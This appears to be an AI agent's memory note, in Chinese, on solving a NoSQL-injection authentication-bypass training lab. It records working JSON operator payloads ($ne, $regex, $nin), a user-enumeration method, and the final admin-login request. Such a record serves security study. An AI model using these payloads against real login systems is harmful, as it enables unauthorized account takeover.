---
metadata:
  node_type: memory
name: "prs-arm-a-lab-nosql-injection-bypass-authentication"
description: "Arm A 解题实录: NoSQL 操作符注入绕认证, 实例管理员名带随机后缀, 胜出载荷 username $regex ^adm"
last_updated: 2026-10-10T11:46:07+08:00
created: 2026-10-10T11:46:07+08:00
---

## 2026-10-10 lab-nosql-injection-bypass-authentication (arm A, 一次通过)

实例: 0acd0035035a91a880e50d3b00f90016, 无复用(reused:false), jar /tmp/cj1.json。
路径: page_read canonical 路径 → lab_id 522964EA…(522964eab6f4e4217f650c420f52a617e4cc1ec23db87621f575afde879e30e8) → range_launch launch-url/launch 直接起实例(未重复取号)。

关键事实(本次实测,与常见写法不同):
- 登录页用 jsonSubmit('/login') → POST /login + Content-Type: application/json,body 是 JSON。
- http_dump --method POST --header 'Content-Type: application/json' 传 JSON 体**不生效**(wiener:peter 也判失败,200 回登录页);http_session post 同参数正常 302。JSON 体登录一律走 http_session。
- 注入面: username/password 均接受对象操作符(wiener + password {"$ne":"wrong"} → 302 登录成功,证明操作符被解析);多余字段(email 等)被忽略(查询只取 username/password 两键)。
- **本实例没有名为 administrator 的账号**: `{"username":"administrator","password":{"$ne":"x"}}` 200 "Invalid username or password";anchored/unanchored + 大小写-insensitive 的 administrator 正则全部无匹配。
- 用户枚举($nin 逐步排除 + `$regex":"."`,Location 回显 id): wiener、carlos、admine8o5uuys(疑似 admin+随机后缀的实例管理员名)。排除这三个后无第四人。
- 胜出请求(解题点): `{"username":{"$regex":"^adm"},"password":{"$ne":"x"}}` → 302 /my-account?id=admine8o5uuys,登录后横幅由后台异步置 Solved。
- `{"username":{"$exists":true},...}` / `$regex":".*"` → 500 "Query returned unexpected number of records"(多文档命中触发应用自检),可当"命中数>1"的旁证 oracle。

教训:
1. 开卷族先读题面即可,取号并入 range_launch 一次完成。
2. 同族件有隐形差异:http_dump 的 --header/--body 组合不可假定等价于 http_session;JSON 体用 http_session。
3. "administrator 不存在"不等于题不可解 —— 先用 $nin 枚举真实用户名,再以名字前缀正则命中实例管理员(随机后缀型)。
4. 解题判定异步,登录成功后即出 /my-account 未必同步显示 Solved;以 banner_verdict 复读为准。

终态: solved=true,"Congratulations, you solved the lab!";
获胜载荷: POST /login {"username":{"$regex":"^adm"},"password":{"$ne":"x"}} (Content-Type: application/json)。

